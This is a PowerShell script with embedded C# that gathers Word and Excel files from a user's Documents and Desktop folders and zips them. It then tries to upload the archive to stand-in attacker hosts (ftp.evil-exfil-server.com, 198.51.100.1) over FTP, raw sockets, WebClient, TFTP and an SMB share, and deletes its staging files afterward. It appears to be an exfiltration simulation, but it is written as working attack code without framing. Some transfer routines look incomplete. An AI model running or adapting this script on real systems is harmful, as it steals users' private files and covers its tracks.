$stagingDir = "$env:TEMP\exfil_$((Get-Random -Max 9999))"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

Get-ChildItem "$env:USERPROFILE\Documents" -Filter "*.docx" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 3 | ForEach-Object {
    Copy-Item $_.FullName $stagingDir -Force -ErrorAction SilentlyContinue
}
Get-ChildItem "$env:USERPROFILE\Desktop" -Filter "*.xlsx" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 3 | ForEach-Object {
    Copy-Item $_.FullName $stagingDir -Force -ErrorAction SilentlyContinue
}
"EXFIL_MARKER_$(Get-Date -Format 'yyyyMMdd_HHmmss')" | Out-File (Join-Path $stagingDir "manifest.txt") -Force

$archive = "$env:TEMP\backup_$(Get-Date -Format 'yyyyMMdd').zip"
try { Compress-Archive -Path "$stagingDir\*" -DestinationPath $archive -Force } catch {}

$ftpScript = @"
open ftp.evil-exfil-server.com
anonymous
anonymous@
binary
cd /incoming
put $archive
quit
"@
$ftpCmd = "$env:TEMP\ftp_commands.txt"
$ftpScript | Out-File $ftpCmd -Encoding ASCII -Force
& ftp.exe -s:$ftpCmd 2>&1 | Out-Null

if (-not ('FTPExfil' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net.Sockets;
    using System.IO;
    public class FTPExfil {
        public static string Upload(string server, int port, string file) {
            try {
                var tcp = new TcpClient();
                tcp.Connect(server, port);
                var stream = tcp.GetStream();
                var writer = new StreamWriter(stream);
                var reader = new StreamReader(stream);
                reader.ReadLine();
                writer.WriteLine("USER anonymous"); writer.Flush(); reader.ReadLine();
                writer.WriteLine("PASS exfil@test.com"); writer.Flush(); reader.ReadLine();
                writer.WriteLine("TYPE I"); writer.Flush(); reader.ReadLine();
                writer.WriteLine("PASV"); writer.Flush(); reader.ReadLine();
                writer.WriteLine("STOR " + Path.GetFileName(file)); writer.Flush(); reader.ReadLine();
                writer.WriteLine("QUIT"); writer.Flush();
                tcp.Close();
                return "FTP done";
            } catch (Exception ex) { return ex.Message; }
        }
    }
'@
}

[FTPExfil]::Upload("ftp.evil-exfil-server.com", 21, $archive) | Out-Null
[FTPExfil]::Upload("198.51.100.1", 21, $archive) | Out-Null

try {
    $wc = New-Object System.Net.WebClient
    $wc.Credentials = New-Object System.Net.NetworkCredential("anonymous", "exfil@test.com")
    $wc.UploadFile("ftp://ftp.evil-exfil-server.com/incoming/$(Split-Path $archive -Leaf)", $archive)
} catch {}

if (-not ('TFTPExfil' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net.Sockets;
    public class TFTPExfil {
        public static string Send(string server, string file) {
            try {
                var udp = new UdpClient();
                byte[] wrq = new byte[] { 0x00, 0x02 };
                byte[] fname = System.Text.Encoding.ASCII.GetBytes(System.IO.Path.GetFileName(file));
                byte[] mode = System.Text.Encoding.ASCII.GetBytes("octet");
                byte[] packet = new byte[wrq.Length + fname.Length + 1 + mode.Length + 1];
                Buffer.BlockCopy(wrq, 0, packet, 0, 2);
                Buffer.BlockCopy(fname, 0, packet, 2, fname.Length);
                Buffer.BlockCopy(mode, 0, packet, 3 + fname.Length, mode.Length);
                udp.Send(packet, packet.Length, server, 69);
                udp.Close();
                return "TFTP sent";
            } catch (Exception ex) { return ex.Message; }
        }
    }
'@
}

[TFTPExfil]::Send("198.51.100.1", $archive) | Out-Null
[TFTPExfil]::Send("ftp.evil-exfil-server.com", $archive) | Out-Null

try { Copy-Item $archive "\\198.51.100.1\share\$(Split-Path $archive -Leaf)" -Force -ErrorAction Stop } catch {}

Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $archive -Force -ErrorAction SilentlyContinue
Remove-Item $ftpCmd -Force -ErrorAction SilentlyContinue
